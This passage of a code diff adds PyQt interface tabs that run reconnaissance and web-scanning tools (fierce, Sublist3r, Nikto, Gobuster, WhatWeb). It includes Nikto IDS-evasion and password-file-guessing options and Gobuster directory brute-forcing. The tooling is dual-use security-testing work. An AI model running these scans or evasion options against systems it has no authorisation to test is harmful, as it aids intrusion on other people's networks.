+    def _create_fierce_tool(self):
+        """Creates the UI for the fierce DNS scanner tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.fierce_controls = self._create_fierce_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.fierce_controls['start_btn'])
+        buttons_layout.addWidget(self.fierce_controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.fierce_output_console = QPlainTextEdit()
+        self.fierce_output_console.setReadOnly(True)
+        self.fierce_output_console.setFont(QFont("Courier New", 10))
+        self.fierce_output_console.setPlaceholderText("fierce output will be displayed here...")
+        main_layout.addWidget(self.fierce_output_console, 1)
+
+        self.fierce_controls['start_btn'].clicked.connect(self.start_fierce_scan)
+        self.fierce_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_fierce_config_widget(self):
+        """Creates a reusable, self-contained widget with fierce's configuration options."""
+        widget = QWidget()
+        main_layout = QFormLayout(widget)
+        controls = {}
+
+        controls['domain_edit'] = QLineEdit("example.com")
+        main_layout.addRow("Domain (--domain):", controls['domain_edit'])
+
+        controls['connect_check'] = QCheckBox("Attempt HTTP Connections")
+        controls['connect_check'].setToolTip("Attempt to connect to any non-RFC1918 hosts found via HTTP.")
+        main_layout.addRow("--connect", controls['connect_check'])
+
+        controls['wide_check'] = QCheckBox("Wide Scan")
+        controls['wide_check'].setToolTip("Scan the entire Class C of any discovered records.")
+        main_layout.addRow("--wide", controls['wide_check'])
+
+        controls['traverse_edit'] = QLineEdit("5")
+        controls['traverse_edit'].setToolTip("Scan a number of IPs above and below discovered hosts.")
+        main_layout.addRow("--traverse", controls['traverse_edit'])
+
+        controls['delay_edit'] = QLineEdit("1")
+        controls['delay_edit'].setToolTip("Delay in seconds between lookups.")
+        main_layout.addRow("--delay", controls['delay_edit'])
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['stop_btn'] = QPushButton("Stop Scan"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_fierce_scan(self):
+        """Starts the fierce scan worker thread."""
+        controls = self.fierce_controls
+        if not shutil.which("fierce"):
+            QMessageBox.critical(self, "fierce Error", "'fierce' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        domain = controls['domain_edit'].text().strip()
+        if not domain:
+            QMessageBox.critical(self, "Input Error", "A domain is required.")
+            return
+
+        command = ["fierce", "--domain", domain]
+
+        if controls['connect_check'].isChecked():
+            command.append("--connect")
+        if controls['wide_check'].isChecked():
+            command.append("--wide")
+        if traverse := controls['traverse_edit'].text().strip():
+            command.extend(["--traverse", traverse])
+        if delay := controls['delay_edit'].text().strip():
+            command.extend(["--delay", delay])
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.fierce_output_console.clear()
+
+        self.worker = WorkerThread(_fierce_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _fierce_thread(self, command):
+        """Worker thread for running the fierce command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting fierce with command: {' '.join(command)}")
+        q.put(('fierce_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.fierce_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('fierce_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('fierce_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'fierce Error', "'fierce' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"fierce thread error: {e}", exc_info=True)
+            q.put(('error', 'fierce Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'fierce_scan'))
+            with self.thread_finish_lock:
+                self.fierce_process = None
+            logging.info("fierce scan thread finished.")
+
+    def _handle_fierce_output(self, line):
+        self.fierce_output_console.insertPlainText(line)
+        self.fierce_output_console.verticalScrollBar().setValue(self.fierce_output_console.verticalScrollBar().maximum())
+
+    def _create_tools_tab(self,p=None):
+        """Creates the tab container for the standard network tools."""
+        tools_tabs = QTabWidget()
+        tools_tabs.addTab(self._create_nmap_scanner_tool(), "Nmap Scan")
+        tools_tabs.addTab(self._create_subdomain_scanner_tool(), "Subdomain Scanner (Sublist3r)")
+        tools_tabs.addTab(self._create_subfinder_tool(), "Subdomain Scanner (Subfinder)")
+        tools_tabs.addTab(self._create_httpx_tool(), "httpx Probe")
+        tools_tabs.addTab(self._create_rustscan_tool(), "RustScan")
+        tools_tabs.addTab(self._create_dirsearch_tool(), "dirsearch")
+        tools_tabs.addTab(self._create_ffuf_tool(), "ffuf")
+        tools_tabs.addTab(self._create_enum4linux_ng_tool(), "enum4linux-ng")
+        tools_tabs.addTab(self._create_dnsrecon_tool(), "dnsrecon")
+        tools_tabs.addTab(self._create_fierce_tool(), "fierce")
+        tools_tabs.addTab(self._create_nikto_scanner_tool(), "Nikto Scan")
+        tools_tabs.addTab(self._create_gobuster_tool(), "Gobuster")
+        tools_tabs.addTab(self._create_whatweb_tool(), "WhatWeb")
+        tools_tabs.addTab(self._create_masscan_tool(), "Masscan")
+        tools_tabs.addTab(self._create_port_scanner_tool(), "Port Scanner (Scapy)")
+        tools_tabs.addTab(self._create_arp_scan_tool(), "ARP Scan (Scapy)")
+        tools_tabs.addTab(self._create_arp_scan_cli_tool(), "ARP Scan (CLI)")
+        tools_tabs.addTab(self._create_ping_sweep_tool(), "Ping Sweep")
+        tools_tabs.addTab(self._create_traceroute_tool(), "Traceroute")
+        return tools_tabs
+
+    def _create_subdomain_scanner_tool(self):
+        """Creates the UI for the Sublist3r Subdomain Scanner tool."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        config_widget, self.subdomain_controls = self._create_subdomain_scanner_config_widget()
+        layout.addWidget(config_widget)
+
+        # Connect signals
+        self.subdomain_controls['start_btn'].clicked.connect(self.start_sublist3r_scan)
+        self.subdomain_controls['cancel_btn'].clicked.connect(self.cancel_tool)
+
+        # --- Output Console ---
+        self.sublist3r_output = QPlainTextEdit()
+        self.sublist3r_output.setReadOnly(True)
+        self.sublist3r_output.setFont(QFont("Courier New", 10))
+        self.sublist3r_output.setPlaceholderText("Sublist3r output will be displayed here...")
+        layout.addWidget(self.sublist3r_output, 1)
+
+        return widget
+
+    def _create_subdomain_scanner_config_widget(self):
+        """Creates a reusable, self-contained widget for the Subdomain scanner's configuration."""
+        widget = QFrame()
+        widget.setObjectName("controlPanel")
+        widget.setStyleSheet("#controlPanel { border: 1px solid #444; border-radius: 8px; padding: 5px; }")
+        controls_layout = QHBoxLayout(widget)
+
+        controls = {}
+
+        controls_layout.addWidget(QLabel("Domain:"))
+        controls['domain_edit'] = QLineEdit("example.com")
+        controls['domain_edit'].setToolTip("Enter the target domain to enumerate subdomains for (e.g., example.com).")
+        controls_layout.addWidget(controls['domain_edit'], 1) # Add stretch
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['cancel_btn'] = QPushButton("Cancel")
+        controls['cancel_btn'].setEnabled(False)
+
+        controls_layout.addWidget(controls['start_btn'])
+        controls_layout.addWidget(controls['cancel_btn'])
+
+        return widget, controls
+
+    def start_sublist3r_scan(self):
+        """Starts the Sublist3r scan worker thread."""
+        controls = self.subdomain_controls
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        domain = controls['domain_edit'].text()
+        if not domain:
+            QMessageBox.critical(self, "Input Error", "Please provide a domain to scan.")
+            return
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['cancel_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.sublist3r_output.clear()
+
+        self.worker = WorkerThread(_sublist3r_thread, args=(self, domain,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _create_nikto_scanner_tool(self):
+        """Creates the UI for the Nikto Web Scanner tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.nikto_controls = self._create_nikto_config_widget()
+        main_layout.addWidget(config_widget)
+
+        controls = self.nikto_controls
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(controls['start_btn'])
+        buttons_layout.addWidget(controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.nikto_output_console = QPlainTextEdit()
+        self.nikto_output_console.setReadOnly(True)
+        self.nikto_output_console.setFont(QFont("Courier New", 10))
+        self.nikto_output_console.setPlaceholderText("Nikto output will be displayed here...")
+        main_layout.addWidget(self.nikto_output_console, 1)
+
+        controls['start_btn'].clicked.connect(self.start_nikto_scan)
+        controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_nikto_config_widget(self):
+        """Creates a reusable, self-contained widget with all of Nikto's configuration options."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+        main_layout.setContentsMargins(0,0,0,0)
+
+        controls = {}
+
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>Nikto Web Scanner</b></font>
+        <p>This tool runs the Nikto web server scanner. Use the tabs below to configure the scan.</p>
+        """)
+        instructions.setFixedHeight(80)
+        main_layout.addWidget(instructions)
+
+        nikto_tabs = QTabWidget()
+        main_layout.addWidget(nikto_tabs)
+
+        target_tab = QWidget()
+        target_layout = QFormLayout(target_tab)
+        controls['target_edit'] = QLineEdit("localhost"); controls['target_edit'].setToolTip("Enter the target host, IP, or CIDR range to scan.")
+        target_layout.addRow("Target Host:", controls['target_edit'])
+        controls['port_edit'] = QLineEdit("80"); controls['port_edit'].setToolTip("Specify the port(s) to scan. Can be a single port, a comma-separated list (80,443), or a range (80-90).")
+        target_layout.addRow("Target Port:", controls['port_edit'])
+        controls['ssl_check'] = QCheckBox("Force SSL Mode"); controls['ssl_check'].setToolTip("Force SSL mode on the target port(s) (-ssl). Nikto automatically uses SSL on port 443, but this forces it for other non-standard SSL ports.")
+        target_layout.addRow(controls['ssl_check'])
+        controls['vhost_edit'] = QLineEdit(); controls['vhost_edit'].setToolTip("Specify the virtual host to use in the HTTP Host header. Useful for testing multiple sites on one IP.")
+        target_layout.addRow("Virtual Host:", controls['vhost_edit'])
+        nikto_tabs.addTab(target_tab, "Target")
+
+        scan_tab = QWidget()
+        scan_layout = QFormLayout(scan_tab)
+        controls['tuning_combo'] = QComboBox(); controls['tuning_combo'].setToolTip("Select a scan tuning profile (-Tuning) to focus on specific types of tests.\n'x' can be used to reverse the logic (e.g., -Tuning x12 will exclude 'Interesting File' and 'Misconfiguration').")
+        controls['tuning_combo'].addItems(["Default", "0 - File Upload", "1 - Interesting File", "2 - Misconfiguration", "3 - Information Disclosure", "4 - Injection (XSS/Script/HTML)", "5 - Remote File Retrieval", "6 - Denial of Service", "8 - Command Execution", "9 - SQL Injection", "a - Auth Bypass", "b - Software ID", "c - Remote Source Inclusion", "x - Reverse Tuning"])
+        scan_layout.addRow("Tuning Profile:", controls['tuning_combo'])
+        controls['mutate_combo'] = QComboBox(); controls['mutate_combo'].setToolTip("Perform mutation tests (-mutate) to guess additional file and directory names based on known ones found during the scan.")
+        controls['mutate_combo'].addItems(["None", "1 - Test files with root dirs", "2 - Guess password files", "3 - Enumerate users via Apache", "4 - Enumerate users via cgiwrap", "5 - Brute force sub-domains", "6 - Guess directory names"])
+        scan_layout.addRow("Mutate:", controls['mutate_combo'])
+        controls['plugins_edit'] = QLineEdit(); controls['plugins_edit'].setToolTip("Select specific plugins to run, separated by commas (e.g., apache_users,cgi).\nUse 'list' to see all available plugins in the console output.")
+        scan_layout.addRow("Plugins:", controls['plugins_edit'])
+        controls['cgidirs_edit'] = QLineEdit(); controls['cgidirs_edit'].setToolTip("Scan these CGI directories. Common values are 'all', 'none', or a specific path like '/cgi-bin/'.")
+        scan_layout.addRow("CGI Dirs:", controls['cgidirs_edit'])
+        nikto_tabs.addTab(scan_tab, "Scan")
+
+        evasion_tab = QWidget()
+        evasion_layout = QFormLayout(evasion_tab)
+        controls['evasion_combo'] = QComboBox(); controls['evasion_combo'].setToolTip("Select an IDS evasion technique (-evasion).\nThese techniques attempt to bypass Intrusion Detection Systems by encoding or formatting requests in non-standard ways. Use with caution.")
+        controls['evasion_combo'].addItems(["None", "1 - Random URI encoding", "2 - Directory self-reference (/./)", "3 - Premature URL ending", "4 - Prepend long random string", "5 - Fake parameter", "6 - TAB as request spacer", "7 - Change case of URL", "8 - Use Windows directory separator (\\)", "A - Use carriage return (0x0d)", "B - Use binary value 0x0b"])
+        evasion_layout.addRow("Evasion Technique:", controls['evasion_combo'])
+        nikto_tabs.addTab(evasion_tab, "Evasion")
+
+        config_tab = QWidget()
+        config_layout = QFormLayout(config_tab)
+        controls['timeout_edit'] = QLineEdit("10"); controls['timeout_edit'].setToolTip("Set the timeout in seconds for each individual HTTP request (default is 10).")
+        config_layout.addRow("Timeout (s):", controls['timeout_edit'])
+        controls['maxtime_edit'] = QLineEdit(); controls['maxtime_edit'].setToolTip("Set the maximum total testing time for the entire scan per host (e.g., 1h, 60m, 3600s).")
+        config_layout.addRow("Max Time:", controls['maxtime_edit'])
+        controls['pause_edit'] = QLineEdit(); controls['pause_edit'].setToolTip("Pause in seconds between each test (HTTP request). Useful for reducing scan speed.")
+        config_layout.addRow("Pause (s):", controls['pause_edit'])
+        controls['id_edit'] = QLineEdit(); controls['id_edit'].setToolTip("Provide HTTP Basic authentication credentials in the format 'id:password' or 'id:password:realm'.")
+        config_layout.addRow("Auth (id:pass):", controls['id_edit'])
+        controls['root_edit'] = QLineEdit(); controls['root_edit'].setToolTip("Prepend a value to the beginning of every request URI. Useful if the web application is in a subdirectory (e.g., /app).")
+        config_layout.addRow("Root Directory:", controls['root_edit'])
+        controls['proxy_check'] = QCheckBox("Use proxy from nikto.conf")
+        config_layout.addRow(controls['proxy_check'])
+        nikto_tabs.addTab(config_tab, "Config")
+
+        output_tab = QWidget()
+        output_layout = QFormLayout(output_tab)
+        output_file_layout = QHBoxLayout()
+        controls['output_file_edit'] = QLineEdit(); controls['output_file_edit'].setPlaceholderText("Optional: path to save report...")
+        output_file_layout.addWidget(controls['output_file_edit'])
+        browse_out_btn = QPushButton("Browse..."); browse_out_btn.clicked.connect(self.browse_nikto_output)
+        output_file_layout.addWidget(browse_out_btn)
+        output_layout.addRow("Output File:", output_file_layout)
+        controls['format_combo'] = QComboBox(); controls['format_combo'].addItems(["html", "csv", "txt", "xml", "nbe"]); controls['format_combo'].setToolTip("Select the report format (requires an output file to be set).")
+        output_layout.addRow("Report Format:", controls['format_combo'])
+        save_dir_layout = QHBoxLayout()
+        controls['save_dir_edit'] = QLineEdit(); controls['save_dir_edit'].setPlaceholderText("Optional: directory to save positive responses...")
+        save_dir_layout.addWidget(controls['save_dir_edit'])
+        browse_save_btn = QPushButton("Browse..."); browse_save_btn.clicked.connect(self.browse_nikto_save_dir)
+        save_dir_layout.addWidget(browse_save_btn)
+        output_layout.addRow("Save Directory:", save_dir_layout)
+        nikto_tabs.addTab(output_tab, "Output")
+
+        controls['extra_opts_edit'] = QLineEdit(); controls['extra_opts_edit'].setToolTip("Enter any additional, space-separated Nikto flags here. These will be appended directly to the command.")
+        main_layout.addWidget(QLabel("Additional Raw Options:"))
+        main_layout.addWidget(controls['extra_opts_edit'])
+
+        # Add buttons to controls dict for external connection
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Nikto Scan")
+        controls['stop_btn'] = QPushButton("Stop Nikto"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_nikto_scan(self):
+        """Starts the Nikto scan worker thread by building a command from the extensive UI options."""
+        controls = self.nikto_controls
+        if not shutil.which("nikto"):
+            QMessageBox.critical(self, "Nikto Error", "'nikto' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target = controls['target_edit'].text().strip()
+        if not target:
+            QMessageBox.critical(self, "Input Error", "A target host is required.")
+            return
+        command = ["nikto", "-host", target]
+
+        if port := controls['port_edit'].text().strip():
+            command.extend(["-port", port])
+        if controls['ssl_check'].isChecked():
+            command.append("-ssl")
+        if vhost := controls['vhost_edit'].text().strip():
+            command.extend(["-vhost", vhost])
+        if (tuning_text := controls['tuning_combo'].currentText()) != "Default":
+            command.extend(["-Tuning", tuning_text.split(" ")[0]])
+        if (mutate_text := controls['mutate_combo'].currentText()) != "None":
+            command.extend(["-mutate", mutate_text.split(" ")[0]])
+        if plugins := controls['plugins_edit'].text().strip():
+            command.extend(["-Plugins", plugins])
+        if cgidirs := controls['cgidirs_edit'].text().strip():
+            command.extend(["-Cgidirs", cgidirs])
+        if (evasion_text := controls['evasion_combo'].currentText()) != "None":
+            command.extend(["-evasion", evasion_text.split(" ")[0]])
+        if (timeout := controls['timeout_edit'].text().strip()) != "10":
+            command.extend(["-timeout", timeout])
+        if maxtime := controls['maxtime_edit'].text().strip():
+            command.extend(["-maxtime", maxtime])
+        if pause := controls['pause_edit'].text().strip():
+            command.extend(["-Pause", pause])
+        if auth_id := controls['id_edit'].text().strip():
+            command.extend(["-id", auth_id])
+        if root := controls['root_edit'].text().strip():
+            command.extend(["-root", root])
+        if controls['proxy_check'].isChecked():
+            command.append("-useproxy")
+        if output_file := controls['output_file_edit'].text().strip():
+            output_format = controls['format_combo'].currentText()
+            command.extend(["-o", output_file, "-Format", output_format])
+        if save_dir := controls['save_dir_edit'].text().strip():
+            command.extend(["-Save", save_dir])
+        if extra_opts := controls['extra_opts_edit'].text().strip():
+            command.extend(extra_opts.split())
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.nikto_output_console.clear()
+
+        self.worker = WorkerThread(_nikto_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _create_gobuster_tool(self):
+        """Creates the UI for the Gobuster tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.gobuster_controls = self._create_gobuster_config_widget()
+        main_layout.addWidget(config_widget)
+
+        controls = self.gobuster_controls
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(controls['start_btn'])
+        buttons_layout.addWidget(controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.gobuster_output_console = QPlainTextEdit()
+        self.gobuster_output_console.setReadOnly(True)
+        self.gobuster_output_console.setFont(QFont("Courier New", 10))
+        self.gobuster_output_console.setPlaceholderText("Gobuster output will be displayed here...")
+        main_layout.addWidget(self.gobuster_output_console, 1)
+
+        controls['start_btn'].clicked.connect(self.start_gobuster_scan)
+        controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_gobuster_config_widget(self):
+        """Creates a reusable, self-contained widget with all of Gobuster's configuration options."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+        main_layout.setContentsMargins(0,0,0,0)
+
+        controls = {}
+
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>Gobuster Directory/File Brute-forcer</b></font>
+        <p>This tool uses Gobuster to discover hidden directories and files on web servers. Configure the scan using the tabs below.</p>
+        """)
+        instructions.setFixedHeight(80)
+        main_layout.addWidget(instructions)
+
+        gobuster_tabs = QTabWidget()
+        main_layout.addWidget(gobuster_tabs)
+
+        scan_tab = QWidget()
+        scan_layout = QFormLayout(scan_tab)
+        controls['url_edit'] = QLineEdit("http://localhost"); controls['url_edit'].setToolTip("The full URL of the target application to scan, including the scheme (http/https).")
+        scan_layout.addRow("Target URL:", controls['url_edit'])
+
+        wordlist_layout = QHBoxLayout()
+        controls['wordlist_edit'] = QLineEdit(); controls['wordlist_edit'].setPlaceholderText("Path to wordlist file (required)..."); controls['wordlist_edit'].setToolTip("The path to the wordlist file to use for brute-forcing directories and files.")
+        wordlist_layout.addWidget(controls['wordlist_edit'])
+        browse_wordlist_btn = QPushButton("Browse..."); browse_wordlist_btn.clicked.connect(self.browse_gobuster_wordlist)
+        wordlist_layout.addWidget(browse_wordlist_btn)
+        scan_layout.addRow("Wordlist:", wordlist_layout)
+
+        controls['threads_edit'] = QLineEdit("10"); controls['threads_edit'].setToolTip("Number of concurrent threads to use for the scan. Higher numbers are faster but can overwhelm the target.")
+        scan_layout.addRow("Threads:", controls['threads_edit'])
+        controls['extensions_edit'] = QLineEdit("php,html,txt"); controls['extensions_edit'].setToolTip("A comma-separated list of file extensions to append to each word in the wordlist (e.g., php,html,txt) (-x).")
+        scan_layout.addRow("Extensions (-x):", controls['extensions_edit'])
+        controls['status_codes_edit'] = QLineEdit("200,204,301,302,307"); controls['status_codes_edit'].setToolTip("A comma-separated list of HTTP status codes to treat as valid and display in the results (e.g., 200,204,301) (-s).")
+        scan_layout.addRow("Status Codes (-s):", controls['status_codes_edit'])
+        controls['status_codes_blacklist_edit'] = QLineEdit("404"); controls['status_codes_blacklist_edit'].setToolTip("A comma-separated list of status codes to hide from the output (e.g., 403,404) (-b). This takes precedence over the positive status code list.")
+        scan_layout.addRow("Blacklist Status Codes (-b):", controls['status_codes_blacklist_edit'])
+
+        checkbox_layout = QHBoxLayout()
+        controls['add_slash_check'] = QCheckBox("Add Slash"); controls['add_slash_check'].setToolTip("Append a forward slash to each directory request (-f). Useful for specifically finding directories.")
+        checkbox_layout.addWidget(controls['add_slash_check'])
+        controls['follow_redirect_check'] = QCheckBox("Follow Redirect"); controls['follow_redirect_check'].setToolTip("Follow HTTP redirects to their final destination (-r).")
+        checkbox_layout.addWidget(controls['follow_redirect_check'])
+        scan_layout.addRow(checkbox_layout)
+        gobuster_tabs.addTab(scan_tab, "Scan Options")
+
+        request_tab = QWidget()
+        request_layout = QFormLayout(request_tab)
+        controls['useragent_edit'] = QLineEdit(); controls['useragent_edit'].setToolTip("Set a custom User-Agent string for all requests. Can be used to impersonate different browsers.")
+        request_layout.addRow("User-Agent:", controls['useragent_edit'])
+        controls['random_agent_check'] = QCheckBox("Use Random User-Agent")
+        request_layout.addRow(controls['random_agent_check'])
+        controls['cookies_edit'] = QLineEdit(); controls['cookies_edit'].setToolTip("Set cookies for the request. The format is 'name=value; name2=value2'.")
+        request_layout.addRow("Cookies:", controls['cookies_edit'])
+        controls['proxy_edit'] = QLineEdit(); controls['proxy_edit'].setToolTip("Proxy server to use for requests (e.g., http://127.0.0.1:8080, socks5://127.0.0.1:9050).")
+        request_layout.addRow("Proxy:", controls['proxy_edit'])
+        controls['timeout_edit'] = QLineEdit("10s"); controls['timeout_edit'].setToolTip("Timeout for each individual HTTP request (e.g., 10s, 1m, 500ms).")
+        request_layout.addRow("Timeout:", controls['timeout_edit'])
+        controls['username_edit'] = QLineEdit()
+        request_layout.addRow("Username (Basic Auth):", controls['username_edit'])
+        controls['password_edit'] = QLineEdit(); controls['password_edit'].setEchoMode(QLineEdit.EchoMode.Password)
+        request_layout.addRow("Password (Basic Auth):", controls['password_edit'])
+        gobuster_tabs.addTab(request_tab, "Request")
+
+        output_tab = QWidget()
+        output_layout = QFormLayout(output_tab)
+        output_file_layout = QHBoxLayout()
+        controls['output_file_edit'] = QLineEdit(); controls['output_file_edit'].setPlaceholderText("Optional: path to save output file...")
+        output_file_layout.addWidget(controls['output_file_edit'])
+        browse_out_btn = QPushButton("Browse..."); browse_out_btn.clicked.connect(self.browse_gobuster_output)
+        output_file_layout.addWidget(browse_out_btn)
+        output_layout.addRow("Output File:", output_file_layout)
+
+        output_checkbox_layout = QHBoxLayout()
+        controls['no_progress_check'] = QCheckBox("No Progress"); controls['no_progress_check'].setToolTip("Don't display the real-time progress bar during the scan (-z).")
+        output_checkbox_layout.addWidget(controls['no_progress_check'])
+        controls['quiet_check'] = QCheckBox("Quiet"); controls['quiet_check'].setToolTip("Don't print the startup banner and other non-result information (-q).")
+        output_checkbox_layout.addWidget(controls['quiet_check'])
+        controls['expanded_check'] = QCheckBox("Expanded View"); controls['expanded_check'].setToolTip("Print the full URL for each result, not just the relative path (-e).")
+        output_checkbox_layout.addWidget(controls['expanded_check'])
+        output_layout.addRow(output_checkbox_layout)
+        gobuster_tabs.addTab(output_tab, "Output")
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Gobuster Scan")
+        controls['stop_btn'] = QPushButton("Stop Gobuster"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def browse_gobuster_wordlist(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select Wordlist File", "", "Text Files (*.txt);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            self.gobuster_controls['wordlist_edit'].setText(file_path)
+
+    def browse_gobuster_output(self):
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save Gobuster Output", "", "Text Files (*.txt);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            self.gobuster_controls['output_file_edit'].setText(file_path)
+
+    def start_gobuster_scan(self):
+        """Starts the Gobuster scan worker thread."""
+        controls = self.gobuster_controls
+        if not shutil.which("gobuster"):
+            QMessageBox.critical(self, "Gobuster Error", "'gobuster' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        url = controls['url_edit'].text().strip()
+        wordlist = controls['wordlist_edit'].text().strip()
+
+        if not url or not wordlist:
+            QMessageBox.critical(self, "Input Error", "Target URL and Wordlist are required.")
+            return
+
+        command = ["gobuster", "dir", "-u", url, "-w", wordlist]
+
+        if threads := controls['threads_edit'].text().strip():
+            command.extend(["-t", threads])
+        if extensions := controls['extensions_edit'].text().strip():
+            command.extend(["-x", extensions])
+        if status_codes := controls['status_codes_edit'].text().strip():
+            command.extend(["-s", status_codes])
+        if blacklist_codes := controls['status_codes_blacklist_edit'].text().strip():
+            command.extend(["-b", blacklist_codes])
+        if controls['add_slash_check'].isChecked():
+            command.append("-f")
+        if controls['follow_redirect_check'].isChecked():
+            command.append("-r")
+        if useragent := controls['useragent_edit'].text().strip():
+            command.extend(["-a", useragent])
+        if controls['random_agent_check'].isChecked():
+            command.append("--random-agent")
+        if cookies := controls['cookies_edit'].text().strip():
+            command.extend(["-c", cookies])
+        if proxy := controls['proxy_edit'].text().strip():
+            command.extend(["--proxy", proxy])
+        if timeout := controls['timeout_edit'].text().strip():
+            command.extend(["--timeout", timeout])
+        if username := controls['username_edit'].text().strip():
+            command.extend(["-U", username])
+        if password := controls['password_edit'].text().strip():
+            command.extend(["-P", password])
+        if output_file := controls['output_file_edit'].text().strip():
+            command.extend(["-o", output_file])
+        if controls['no_progress_check'].isChecked():
+            command.append("-z")
+        if controls['quiet_check'].isChecked():
+            command.append("-q")
+        if controls['expanded_check'].isChecked():
+            command.append("-e")
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.gobuster_output_console.clear()
+
+        self.worker = WorkerThread(_gobuster_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _create_whatweb_tool(self):
+        """Creates the UI for the WhatWeb tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>WhatWeb - Web Scanner</b></font>
+        <p>This tool identifies technologies used on websites, including content management systems (CMS), blogging platforms, visitor statistics/analytics packages, JavaScript libraries, web servers, and embedded devices.</p>
+        """)
+        instructions.setFixedHeight(100)
+        main_layout.addWidget(instructions)
+
+        # --- Controls ---
+        controls_frame = QGroupBox("Scan Options")
+        controls_layout = QFormLayout(controls_frame)
+
+        self.whatweb_target_edit = QLineEdit("http://localhost")
+        self.whatweb_target_edit.setToolTip("Enter one or more targets to scan, separated by spaces.\nCan be URLs, hostnames, or IP ranges.")
+        controls_layout.addRow("Target(s):", self.whatweb_target_edit)
+
+        self.whatweb_aggression_combo = QComboBox()
+        self.whatweb_aggression_combo.addItems(["1 - Stealthy", "3 - Aggressive", "4 - Heavy"])
+        self.whatweb_aggression_combo.setToolTip("Set the aggression level (-a).\n- 1 (Stealthy): Light and fast, makes few requests.\n- 3 (Aggressive): Makes more requests, may trigger alerts.\n- 4 (Heavy): Very noisy, runs every single plugin.")
+        controls_layout.addRow("Aggression Level (-a):", self.whatweb_aggression_combo)
+
+        self.whatweb_verbose_check = QCheckBox("Enable Verbose Output (-v)")
+        self.whatweb_verbose_check.setToolTip("Enable verbose output (-v).\nShows more detail during the scan, including which plugins are running.")
+        controls_layout.addRow(self.whatweb_verbose_check)
+
+        self.whatweb_extra_opts_edit = QLineEdit()
+        self.whatweb_extra_opts_edit.setToolTip("Enter any additional, space-separated WhatWeb flags here. These will be appended directly to the command.")
